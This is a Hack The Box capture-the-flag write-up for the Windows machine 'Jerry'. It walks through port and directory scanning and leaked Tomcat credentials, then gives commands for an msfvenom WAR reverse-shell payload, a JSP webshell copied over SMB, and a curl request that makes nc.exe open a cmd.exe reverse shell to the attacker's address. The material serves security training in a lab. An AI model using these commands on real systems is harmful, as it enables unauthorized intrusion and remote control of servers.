---
layout: single
title: Jerry - Hack The Box
excerpt: "Jerry is an easy-difficulty Windows machine that showcases how to exploit Apache Tomcat, leading to an 'NT Authority\\SYSTEM` shell, thus fully compromising the target."
date: 2025-05-26
classes: wide
header:
  teaser: /img2/jerry.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Easy
tags:
  - Information Leakage
  - Abusing Tomcat [Intrusion & Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.95
```

![](/img2/Pasted%20image%2020250522153018.png)

- Gobuster

```bash
gobuster dir -u http://10.10.10.95:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```

![](/img2/Pasted%20image%2020250522164149.png)

- Leaked credentials

![](/img2/Pasted%20image%2020250522164224.png)

## Exploitation

- Upload .war reverse shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.7 LPORT=9000 -f war > shell.war
```

![](/img2/Pasted%20image%2020250522164341.png)

```bash
rlwrap nc -nlvp 9000
```

## Post-exploitation

- Apache Tomcat WebShell Privilege Scalation

```bash
searchsploit Tomcat Privilege Scalation
```

![](/img2/Pasted%20image%2020250526102938.png)

```bash
searchsploit -m windows/local/7264.txt
```

```bash
mv 7264.txt 7264.jsp
```

```bash
impacket-smbserver smb -smb $(pwd) -smb2support
```

- Change to web directory

```cmd
cd C:\apache-tomcat-7.0.88\webapps\ROOT
```

```cmd
copy \\10.10.16.7\smb\7264.jsp
```

- Send Reverse Shell

```bash
curl http://10.10.10.95:8080/cmd.jsp?cmd=C%3A%5CWindows%5CTemp%5Cnc.exe%2010.10.16.7%204444%20-e%20cmd.exe
```

```bash
rlwrap nc -nvlp 4444
```

- View flags file

```cmd
type 2*
```

![](/img2/Pasted%20image%2020250526103600.png)

![](/img2/Pasted%20image%2020250526103906.png)